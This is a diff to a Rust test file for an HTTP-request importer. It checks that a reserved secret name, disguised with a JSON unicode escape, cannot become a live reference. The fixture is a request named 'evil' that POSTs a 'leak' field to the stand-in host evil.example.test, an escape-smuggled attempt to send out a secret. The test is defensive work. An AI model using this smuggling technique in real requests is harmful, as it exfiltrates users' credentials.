@@ -2,7 +2,7 @@ mod common;
 
 use anvil_domain::Id;
 use anvil_domain::auth::AuthConfig;
-use anvil_domain::request::KeyValue;
+use anvil_domain::request::{Body, KeyValue};
 use anvil_domain::secret::SensitiveValue;
 use anvil_domain::workspace::{RequestDefinition, Variable};
 use anvil_import::{
@@ -1352,20 +1352,23 @@ fn refused(label: &str, source: &[u8]) {
     }
 }
 
-/// Sol F1: a name decoded from an embedded JSON body (a `\u` escape, with
-/// and without the duplicate-member rewrite) is refused: the check runs on
-/// the output, after every decoding.
+/// Sol F1: a name decoded from an embedded JSON body is refused once the
+/// import rewrites the body (here for a repeated member), because the check
+/// runs on the output, after every decoding. A body kept as written keeps the
+/// escape, which names nothing the engine resolves, and imports.
 #[test]
 fn a_reserved_name_decoded_from_an_embedded_body_is_refused() {
     let name = reserved("secret", None);
     let escaped = format!("\\u0073{}", &name[1..]);
-    for raw in [format!(r#"{{"leak":"{{{{{escaped}}}}}","x":1,"x":2}}"#), format!(r#"{{"leak":"{{{{{escaped}}}}}"}}"#)] {
-        let doc =
-            postman_items(vec![serde_json::json!({ "name": "evil", "request": { "method": "POST", "url": "https://evil.example.test/",
+    let doc = |raw: String| {
+        postman_items(vec![serde_json::json!({ "name": "evil", "request": { "method": "POST", "url": "https://evil.example.test/",
             "header": [{ "key": "Content-Type", "value": "application/json" }],
-            "body": { "mode": "raw", "raw": raw, "options": { "raw": { "language": "json" } } } } })]);
-        refused("embedded JSON body", doc.as_bytes());
-    }
+            "body": { "mode": "raw", "raw": raw, "options": { "raw": { "language": "json" } } } } })])
+    };
+    refused("embedded JSON body, rewritten", doc(format!(r#"{{"leak":"{{{{{escaped}}}}}","x":1,"x":2}}"#)).as_bytes());
+    let kept = import(doc(format!(r#"{{"leak":"{{{{{escaped}}}}}"}}"#)).as_bytes(), &opts()).expect("a body kept as written");
+    let Body::Json { text } = &kept.requests[0].spec.body else { panic!("expected a JSON body") };
+    assert!(!text.contains(&format!("{{{{{name}}}}}")), "an escaped name became a live reference");
 }
 
 /// Sol F2: a name assembled from source fragments (two cURL `--json`
